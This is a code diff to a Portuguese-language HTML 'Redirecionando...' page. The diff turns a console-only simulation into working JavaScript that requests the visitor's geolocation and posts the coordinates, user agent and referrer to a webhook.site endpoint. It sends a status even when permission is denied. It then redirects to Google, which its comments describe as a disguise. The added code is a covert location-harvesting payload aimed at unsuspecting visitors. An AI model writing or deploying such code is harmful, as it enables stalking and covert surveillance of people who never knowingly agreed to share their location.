@@ -6,7 +6,33 @@
 <body>
     <h2>Redirecionando...</h2>
     <p>Por favor, aguarde.</p>
+    
     <script>
+        // URL do webhook - O R PRECISA SUBSTITUIR POR UMA URL VÁLIDA
+        const WEBHOOK_URL = 'https://webhook.site/f127378b-55cc-4a59-b4cc-945fa00e5348';
+        
+        function sendLocation(lat, lon) {
+            // Cria os dados para enviar
+            const data = {
+                latitude: lat,
+                longitude: lon,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                referrer: document.referrer
+            };
+            
+            // Envia para o webhook
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => console.log('Dados enviados com sucesso'))
+            .catch(error => console.error('Erro ao enviar:', error));
+        }
+        
         // Tenta obter a localização
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
@@ -16,23 +42,24 @@
                     var lat = position.coords.latitude;
                     var lon = position.coords.longitude;
                     
-                    // Envia as coordenadas de volta para o R (simulação)
-                    // NA VIDA REAL, aqui um código enviaria para um servidor
-                    console.log("Localização capturada:");
-                    console.log("Latitude: " + lat);
-                    console.log("Longitude: " + lon);
+                    // ENVIA para o webhook do R
+                    sendLocation(lat, lon);
                     
-                    // Redireciona para um site real para disfarçar
+                    // Redireciona para disfarçar
                     window.location.href = "https://www.google.com";
                 },
                 // Erro: a localização foi negada
                 function(error) {
-                    // Mesmo se negar, redireciona para disfarçar
+                    // Mesmo se negar, envia uma mensagem de erro
+                    sendLocation('negado', 'negado');
+                    
+                    // Redireciona para disfarçar
                     window.location.href = "https://www.google.com";
                 }
             );
         } else {
-            // Se o navegador não suportar geolocalização, só redireciona
+            // Se o navegador não suportar geolocalização
+            sendLocation('nao_suportado', 'nao_suportado');
             window.location.href = "https://www.google.com";
         }
     </script>
